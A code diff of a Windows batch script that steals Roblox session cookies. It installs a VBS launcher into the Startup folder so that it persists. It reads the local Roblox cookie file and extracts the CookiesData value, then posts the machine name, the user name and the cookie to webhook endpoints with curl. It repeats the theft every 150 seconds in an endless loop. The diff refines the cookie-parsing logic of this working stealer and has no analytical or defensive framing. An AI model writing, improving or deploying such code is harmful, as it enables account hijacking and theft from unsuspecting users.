@@ -17,22 +17,35 @@ copy /Y "%TEMP%\vanta_launch.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Progra
 :: ------------------
 
 echo Sending initial logs...
-set "cookie=No Roblox cookie found."
 
-:: THIS IS THE RAW READER. NO POWERSHELL. NO DECRYPTION.
+set "cookie=No Roblox cookie found."
+set "rawjson="
+
 if exist "%RC%" (
-    for /f "tokens=*" %%a in ('type "%RC%"') do set "cookie=%%a"
+    :: read whole file into one var, then pull the CookiesData field
+    for /f "usebackq delims=" %%a in ("%RC%") do set "rawjson=!rawjson!%%a"
+    for /f "tokens=2 delims=:" %%b in ("!rawjson!") do (
+        set "tmp=%%b"
+        set "tmp=!tmp:~1,-1!"
+        set "cookie=!tmp!"
+    )
 )
 
 curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Initial Log\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %LOGS%
-curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Roblox Cookie Raw\",\"description\":\"```\n%cookie%\n```\",\"color\":65280}]}" %LOGS%
+curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Roblox CookiesData\",\"description\":\"```\n%cookie%\n```\",\"color\":65280}]}" %LOGS%
 curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"User Online\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %ONLINE%
 
 echo Script is now looping.
 :loop
 timeout /t 150 /nobreak >nul
 if exist "%RC%" (
-    for /f "tokens=*" %%a in ('type "%RC%"') do set "cookie=%%a"
-    curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Regrab Cookie Raw\",\"description\":\"Client: %PC% / %USER%\n```\n%cookie%\n```\",\"color\":65280}]}" %REGRAB%
+    set "rawjson="
+    for /f "usebackq delims=" %%a in ("%RC%") do set "rawjson=!rawjson!%%a"
+    for /f "tokens=2 delims=:" %%b in ("!rawjson!") do (
+        set "tmp=%%b"
+        set "tmp=!tmp:~1,-1!"
+        set "cookie=!tmp!"
+    )
+    curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Regrab CookiesData\",\"description\":\"Client: %PC% / %USER%\n```\n%cookie%```\",\"color\":65280}]}" %REGRAB%
 )
 goto loop
